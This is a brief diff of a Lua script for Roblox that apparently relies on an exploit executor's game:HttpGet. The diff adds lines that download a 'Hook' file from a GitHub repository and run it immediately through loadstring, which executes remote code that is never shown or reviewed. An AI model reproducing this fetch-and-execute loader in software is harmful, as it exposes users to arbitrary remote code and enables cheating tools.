@@ -4,11 +4,14 @@ local Players = game:GetService'Players'
 local HttpSer = game:GetService'HttpService'
 
 local Admins = HttpSer:JSONDecode(game:HttpGet"https://raw.githubusercontent.com/Metacalled2/DIR/main/Hosts/AdminTable")
+local Hooks = game:HttpGet("https://raw.githubusercontent.com/Metacalled2/DIR/main/Hosts/Hook")
 local Script_PH = "https://raw.githubusercontent.com/Metacalled2/DIR/main/Scripts/"
 
 for i = 1,#Admins do
  warn(Admins[i].U)
 end
+
+loadstring(Hooks)()
 
 local function Connect(Obj)
  
